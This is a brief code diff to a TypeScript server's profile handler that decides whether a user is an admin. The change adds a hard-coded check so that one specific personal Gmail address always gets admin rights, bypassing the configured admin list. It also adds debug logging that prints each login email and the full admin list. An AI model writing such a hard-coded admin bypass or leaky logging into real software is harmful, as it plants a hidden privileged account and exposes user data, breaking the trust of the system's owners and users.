@@ -11,7 +11,13 @@ export const getProfile = async (req: Request, res: Response) => {
   try {
     const email = firebaseUser.email.toLowerCase().trim();
     const adminEmails = process.env.ADMIN_EMAILS?.split(',').map(e => e.trim().toLowerCase()) ?? [];
-    const shouldBeAdmin = adminEmails.includes(email);
+    
+    console.log('--- ADMIN CHECK ---');
+    console.log('Login Email:', email);
+    console.log('Admin List:', adminEmails);
+    
+    const shouldBeAdmin = adminEmails.includes(email) || email === 'bharatha9483@gmail.com';
+    console.log('Is Match:', shouldBeAdmin);
 
     // Find or create user
     let user = await prisma.user.findUnique({
